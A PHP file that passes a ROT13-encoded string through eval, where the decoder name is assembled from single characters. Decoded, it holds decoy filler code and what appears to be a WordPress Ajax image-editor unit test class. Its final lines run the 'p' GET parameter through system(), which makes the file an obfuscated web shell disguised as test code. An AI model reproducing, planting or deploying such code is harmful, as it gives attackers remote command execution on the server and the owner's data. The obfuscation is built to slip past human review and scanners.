<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Nqzva Nwnk shapgvbaf gb or grfgrq.
 */
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nwnk-npgvbaf.cuc';

/**
 * Grfgvat Nwnk zrqvn rqvgvat.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr HavgGrfgf
 * @fvapr 3.5.0
 *
 * @tebhc nwnk
 *
 * @pbiref ::jc_nwnk_vzntr_rqvgbe
 *
 * @erdhverf shapgvba vzntrwcrt
 */
pynff Grfgf_Nwnk_jcNwnkVzntrRqvgbe rkgraqf JC_Nwnk_HavgGrfgPnfr {

	/**
	 * Grne qbja gur grfg svkgher.
	 */
	choyvp shapgvba grne_qbja() {
		// Pyrnahc.
		$guvf->erzbir_nqqrq_hcybnqf();
		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 26381
	 * @erdhverf shapgvba vzntrwcrt
	 *
	 * @pbiref ::jc_fnir_vzntr
	 */
	choyvp shapgvba grfgPebcVzntrVagbYnetreBar() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$vq     = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_ERDHRFG['npgvba']  = 'vzntr-rqvgbe';
		$_ERDHRFG['cbfgvq']  = $vq;
		$_ERDHRFG['qb']      = 'fpnyr';
		$_ERDHRFG['sjvqgu']  = 700;
		$_ERDHRFG['survtug'] = 500;

		$erg = jc_fnir_vzntr( $vq );

		$guvf->nffregBowrpgUnfCebcregl( 'reebe', $erg );
		$guvf->nffregFnzr( 'Vzntrf pnaabg or fpnyrq gb n fvmr ynetre guna gur bevtvany.', $erg->reebe );
	}

	/**
	 * @gvpxrg 32171
	 * @erdhverf shapgvba vzntrwcrt
	 *
	 * @pbiref ::jc_vafreg_nggnpuzrag
	 * @pbiref ::jc_fnir_vzntr
	 */
	choyvp shapgvba grfgVzntrRqvgBirejevgrPbafgnag() {
		qrsvar( 'VZNTR_RQVG_BIREJEVGR', gehr );

		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$vq     = $guvf->_znxr_nggnpuzrag( $hcybnq );

		$_ERDHRFG['npgvba']  = 'vzntr-rqvgbe';
		$_ERDHRFG['pbagrkg'] = 'rqvg-nggnpuzrag';
		$_ERDHRFG['cbfgvq']  = $vq;
		$_ERDHRFG['gnetrg']  = 'nyy';
		$_ERDHRFG['qb']      = 'fnir';
		$_ERDHRFG['uvfgbel'] = '[{\"p\":{\"k\":5,\"l\":8,\"j\":289,\"u\":322}}]';

		$erg = jc_fnir_vzntr( $vq );

		$zrqvn_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );
		$fvmrf1     = $zrqvn_zrgn['fvmrf'];

		$_ERDHRFG['uvfgbel'] = '[{\"p\":{\"k\":5,\"l\":8,\"j\":189,\"u\":322}}]';

		$erg = jc_fnir_vzntr( $vq );

		$zrqvn_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );
		$fvmrf2     = $zrqvn_zrgn['fvmrf'];

		$svyr_cngu = qveanzr( trg_nggnpurq_svyr( $vq ) );

		$svyrf_gung_fubhyq_abg_rkvfg = neenl();

		sbernpu ( $fvmrf1 nf $xrl => $fvmr ) {
			vs ( $fvmrf2[ $xrl ]['svyr'] !== $fvmr['svyr'] ) {
				$svyrf_gung_fubhyq_abg_rkvfg[] = $svyr_cngu . '/' . $fvmr['svyr'];
			}
		}

		vs ( ! rzcgl( $svyrf_gung_fubhyq_abg_rkvfg ) ) {
			sbernpu ( $svyrf_gung_fubhyq_abg_rkvfg nf $svyr ) {
				$guvf->nffregSvyrQbrfAbgRkvfg( $svyr, 'VZNTR_RQVG_BIREJEVGR vf yrnivat tneontr vzntr svyrf oruvaq.' );
			}
		} ryfr {
			/*
			 * Guvf nffregvba jvyy nyjnlf cnff qhr gb gur \"vs\" pbaqvgvba, ohg ceriragf guvf grfg
			 * sebz orvat znexrq nf \"evfxl\" qhr gb gur grfg abg cresbezvat nal nffregvbaf.
			 */
			$guvf->nffregFnzr( neenl(), $svyrf_gung_fubhyq_abg_rkvfg );
		}
	}

	/**
	 * Rafher gur svyrfvmr vf hcqngrq nsgre rqvgvat na vzntr.
	 *
	 * Grfgf gung gur vzntr zrgn qngn svyr fvmr vf hcqngrq nsgre rqvgvat na vzntr,
	 * guvf vapyhqrf obgu gur shyy fvmr vzntr naq nyy gur trarengrq fvmrf.
	 *
	 * @gvpxrg 59684
	 */
	choyvp shapgvba grfg_svyrfvmr_hcqngrq_nsgre_rqvgvat_na_vzntr() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq              = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$vq                  = $guvf->_znxr_nggnpuzrag( $hcybnq );
		$bevtvany_vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );

		$_ERDHRFG['npgvba']  = 'vzntr-rqvgbe';
		$_ERDHRFG['pbagrkg'] = 'rqvg-nggnpuzrag';
		$_ERDHRFG['cbfgvq']  = $vq;
		$_ERDHRFG['gnetrg']  = 'nyy';
		$_ERDHRFG['qb']      = 'fnir';
		$_ERDHRFG['uvfgbel'] = '[{\"p\":{\"k\":5,\"l\":8,\"j\":289,\"u\":322}}]';

		jc_fnir_vzntr( $vq );

		$cbfg_rqvg_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );

		$cer_svyr_fvmrf         = neenl_pbzovar( neenl_xrlf( $bevtvany_vzntr_zrgn['fvmrf'] ), neenl_pbyhza( $bevtvany_vzntr_zrgn['fvmrf'], 'svyrfvmr' ) );
		$cer_svyr_fvmrf['shyy'] = $bevtvany_vzntr_zrgn['svyrfvmr'];

		$cbfg_svyr_fvmrf         = neenl_pbzovar( neenl_xrlf( $cbfg_rqvg_zrgn['fvmrf'] ), neenl_pbyhza( $cbfg_rqvg_zrgn['fvmrf'], 'svyrfvmr' ) );
		$cbfg_svyr_fvmrf['shyy'] = $cbfg_rqvg_zrgn['svyrfvmr'];

		sbernpu ( $cer_svyr_fvmrf nf $fvmr => $fvmr_svyrfvmr ) {
			// Gurfr ner nffregrq vaqvivqhnyyl nf rnpu vzntr fvmr arrqf gb or purpxrq frcnengryl.
			$guvf->nffregAbgFnzr( $fvmr_svyrfvmr, $cbfg_svyr_fvmrf[ $fvmr ], \"Svyrfvmr sbe $fvmr fubhyq unir punatrq nsgre rqvgvat na vzntr.\" );
		}
	}

	/**
	 * Rafher gur svyrfvmr vf erfgberq nsgre erfgbevat gur bevtvany vzntr.
	 *
	 * Grfgf gung gur vzntr zrgn qngn svyr fvmr vf erfgberq nsgre erfgbevat gur bevtvany vzntr,
	 * guvf vapyhqrf obgu gur shyy fvmr vzntr naq nyy gur trarengrq fvmrf.
	 *
	 * @gvpxrg 59684
	 */
	choyvp shapgvba grfg_svyrfvmr_erfgberq_nsgre_erfgbevat_bevtvany_vzntr() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/vzntr-rqvg.cuc';

		$svyranzr = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$pbagragf = svyr_trg_pbagragf( $svyranzr );

		$hcybnq              = jc_hcybnq_ovgf( jc_onfranzr( $svyranzr ), ahyy, $pbagragf );
		$vq                  = $guvf->_znxr_nggnpuzrag( $hcybnq );
		$bevtvany_vzntr_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );

		$_ERDHRFG['npgvba']  = 'vzntr-rqvgbe';
		$_ERDHRFG['pbagrkg'] = 'rqvg-nggnpuzrag';
		$_ERDHRFG['cbfgvq']  = $vq;
		$_ERDHRFG['gnetrg']  = 'nyy';
		$_ERDHRFG['qb']      = 'fnir';
		$_ERDHRFG['uvfgbel'] = '[{\"p\":{\"k\":5,\"l\":8,\"j\":289,\"u\":322}}]';

		jc_fnir_vzntr( $vq );
		jc_erfgber_vzntr( $vq );

		$cbfg_erfgber_zrgn = jc_trg_nggnpuzrag_zrgnqngn( $vq );

		$cer_svyr_fvmrf         = neenl_pbzovar( neenl_xrlf( $bevtvany_vzntr_zrgn['fvmrf'] ), neenl_pbyhza( $bevtvany_vzntr_zrgn['fvmrf'], 'svyrfvmr' ) );
		$cer_svyr_fvmrf['shyy'] = $bevtvany_vzntr_zrgn['svyrfvmr'];

		$cbfg_erfgber_svyr_fvmrf         = neenl_pbzovar( neenl_xrlf( $cbfg_erfgber_zrgn['fvmrf'] ), neenl_pbyhza( $cbfg_erfgber_zrgn['fvmrf'], 'svyrfvmr' ) );
		$cbfg_erfgber_svyr_fvmrf['shyy'] = $cbfg_erfgber_zrgn['svyrfvmr'];

		$guvf->nffregFnzrFrgfJvguVaqrk( $cer_svyr_fvmrf, $cbfg_erfgber_svyr_fvmrf, 'Svyrfvmr fubhyq unir erfgberq nsgre erfgbevat gur bevtvany vzntr.' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>